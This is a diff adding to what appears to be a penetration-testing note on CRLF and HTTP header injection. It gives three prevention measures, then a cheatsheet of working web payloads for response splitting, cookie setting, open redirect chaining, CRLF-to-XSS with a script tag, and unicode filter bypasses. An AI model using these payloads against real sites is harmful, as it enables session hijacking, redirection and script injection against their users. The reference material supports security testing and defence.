@@ -142,3 +142,38 @@ GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0
 GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1
 ```
 
+---
+# How to Prevent CRLF / HTTP Header Injections in Web Applications
+
+>To mitigate the risks of CRLF (Carriage Return and Line Feed) or HTTP Header Injections in web applications, the following strategies are recommended:
+
+1.  **Avoid Direct User Input in Response Headers:** The safest approach is to refrain from incorporating user-supplied input directly into response headers.
+2.  **Encode Special Characters:** If avoiding direct user input is not feasible, ensure to employ a function dedicated to encoding special characters like CR (Carriage Return) and LF (Line Feed). This practice prevents the possibility of CRLF injection.
+3.  **Update Programming Language:** Regularly update the programming language used in your web applications to the latest version. Opt for a version that inherently disallows the injection of CR and LF characters within functions tasked with setting HTTP headers.
+
+---
+## CHEATSHEET :
+
+
+```url
+1\. HTTP Response Splitting
+- /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)
+
+2. CRLF chained with Open Redirect
+- //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
+- /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
+- /google.com/%2F..%0D%0AHeader-Test:test2
+- /%0d%0aLocation:%20http://example.com
+
+3. CRLF Injection to XSS
+- /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
+- /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+
+4. Filter Bypass
+- %E5%98%8A = %0A = \u560a
+- %E5%98%8D = %0D = \u560d
+- %E5%98%BE = %3E = \u563e (>)
+- %E5%98%BC = %3C = \u563c (<)
+- Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
+```
+
